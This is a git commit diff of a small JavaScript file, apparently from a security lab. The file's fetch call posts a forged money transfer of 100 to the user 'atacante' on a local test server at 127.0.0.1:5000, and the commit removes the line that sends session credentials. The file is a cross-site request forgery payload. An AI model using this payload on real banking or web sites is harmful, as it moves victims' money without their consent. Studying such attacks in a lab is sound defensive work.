c9a0f8d9416d5677db651d6accfd2d42d64225e6
Alvaro Gil <101978161+agm2716@users.noreply.github.com>
2025-11-28 19:05:07 +0100

    Update main2.js

--- main2.js
+++ main2.js
@@ -1,6 +1,5 @@
 fetch('http://127.0.0.1:5000/transfer', {
     method: 'POST',
     headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    credentials: 'include',
     body: 'to_username=atacante&amount=100&note=Transferencia+automática&submit=Transferir'
 });
